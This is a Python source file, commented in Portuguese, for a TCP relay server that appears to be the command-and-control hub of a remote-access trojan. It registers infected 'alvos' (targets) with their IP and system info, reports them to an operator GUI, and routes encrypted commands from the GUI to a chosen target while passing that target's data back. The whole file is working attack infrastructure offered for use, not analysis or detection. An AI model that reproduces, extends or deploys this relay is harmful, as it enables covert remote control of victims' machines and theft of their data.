import socket, os, threading
from chave import enviar_msg, receber_msg

HOST = "0.0.0.0"
PORTA = int(os.environ.get("PORT", 9001))

# Guarda conexões: alvo_id -> socket
alvos = {}
gui_conn = None
lock = threading.Lock()
proximo_id = 1

def log(t):
    print(f"[RELAY] {t}", flush=True)

def tratar_alvo(conn, addr, aid):
    global gui_conn
    try:
        info = receber_msg(conn, timeout=8) or "?"
        with lock:
            alvos[aid] = {"conn": conn, "ip": addr[0], "info": info}
        log(f"ALVO {aid} conectado: {info}")
        # Avisa GUI se tiver conectada
        with lock:
            if gui_conn:
                try: enviar_msg(gui_conn, f"NOVO_ALVO|{aid}|{addr[0]}|{info}")
                except: pass
        # Só repassa tudo para a GUI
        while True:
            dados = conn.recv(65536)
            if not dados: break
            with lock:
                if gui_conn:
                    try: gui_conn.sendall(dados)
                    except: pass
    except Exception as e:
        log(f"alvo {aid} caiu: {e}")
    finally:
        with lock: alvos.pop(aid, None)
        try: conn.close()
        except: pass

def tratar_gui(conn, addr):
    global gui_conn
    with lock:
        # Desconecta GUI anterior se houver
        if gui_conn:
            try: gui_conn.close()
            except: pass
        gui_conn = conn
    log(f"GUI conectada de {addr[0]}")
    try:
        # Envia lista inicial de alvos
        with lock:
            for aid, d in alvos.items():
                enviar_msg(conn, f"NOVO_ALVO|{aid}|{d['ip']}|{d['info']}")
        # Repassa tudo da GUI para o alvo selecionado
        while True:
            dados = conn.recv(65536)
            if not dados: break
            # Formato: ALVO|12|<dados criptografados>
            if dados.startswith(b"ALVO|"):
                partes = dados.split(b"|", 2)
                if len(partes) == 3:
                    aid = int(partes[1])
                    with lock:
                        a = alvos.get(aid)
                    if a:
                        try: a["conn"].sendall(partes[2])
                        except: pass
    except Exception as e:
        log(f"gui caiu: {e}")
    finally:
        with lock:
            if gui_conn is conn:
                gui_conn = None
        try: conn.close()
        except: pass

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORTA))
    srv.listen(50)
    log(f"RELAY RAILWAY ouvindo em {HOST}:{PORTA}")
    while True:
        conn, addr = srv.accept()
        # Primeira mensagem diz quem é
        try:
            conn.settimeout(5)
            primeiro = receber_msg(conn, timeout=4)
            conn.settimeout(None)
        except Exception:
            primeiro = None
        if primeiro == "EU_SOU_GUI":
            threading.Thread(target=tratar_gui, args=(conn,addr), daemon=True).start()
        else:
            # É alvo — usa o que ele enviou como info
            global proximo_id
            aid = proximo_id
            proximo_id += 1
            threading.Thread(target=tratar_alvo, args=(conn,addr,aid), daemon=True).start()

if __name__ == "__main__":
    main()